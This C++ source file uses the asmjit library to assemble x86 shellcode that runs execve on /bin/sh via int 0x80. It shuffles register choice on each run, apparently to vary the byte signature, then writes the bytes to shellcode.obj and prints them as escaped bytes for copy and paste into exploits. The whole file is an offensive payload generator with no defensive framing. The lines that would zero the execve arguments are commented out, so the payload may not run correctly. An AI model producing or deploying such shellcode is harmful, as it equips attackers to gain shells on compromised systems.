#include <asmjit/asmjit.h>
#include <stdio.h>
#include <fstream>
#include <iostream>
#include <algorithm>
#include <random>
#include <chrono>

using namespace asmjit;

// Signature of the generated function.
typedef int (*Func)(void);

int main(int argc, char *argv[])
{
    // Runtime designed for JIT - it hold relocated functions and controls their lifetime.
    JitRuntime rt;

    // Holds code and relocation information during code generation.
    CodeHolder code;

    // initialize codeholder struct
    code.init(rt.environment());

    // create an assembler for x86 systems
    x86::Assembler a(&code);

    x86::Gp gp_registers[] = {x86::eax, x86::ecx, x86::edx, x86::esi, x86::edi};

    // shuffle previous array of general purpose registers
    unsigned seed = std::chrono::system_clock::now().time_since_epoch().count();
    std::shuffle(std::begin(gp_registers), std::end(gp_registers), std::default_random_engine(seed));

    x86::Gp syscall_number_reg = gp_registers[0];
    x86::Gp null_byte_reg = gp_registers[1];

    a.xor_(null_byte_reg, null_byte_reg);
    a.push(null_byte_reg);

    // /bin/sh
    a.push(imm(0x0068732f));
    a.push(imm(0x6e69622f));

    a.mov(x86::ebx, x86::esp);

    // execve
    a.mov(syscall_number_reg, imm(0xb));
    a.push(syscall_number_reg);
    a.pop(x86::eax);
    // a.xor_(x86::ecx, x86::ecx);
    // a.xor_(x86::edx, x86::edx);
    a.int_(imm(0x80));

    code.detach(&a);

    // copy the code from CodeHolder into memory with executable permission and relocate it.
    Func fn;

    size_t code_size = (&code)->codeSize();
    Error err = rt.add(&fn, &code);

    // It's always a good idea to handle errors, especially those returned from the Runtime.
    if (err)
    {
        std::cout << "ERRROR\n";
        return 1; // Handle a possible error returned by AsmJit.
    }

    // write bytes to file
    std::ofstream ofile("shellcode.obj", std::ios::binary);
    ofile.write((char *)fn, code_size);

    // print bytes for easy copy paste
    for (size_t i = 0; i < code_size; i++)
    {
        uint8_t b = *((uint8_t *)fn + i);
        printf("\\x%02x", b);
    }

    return 0;
}
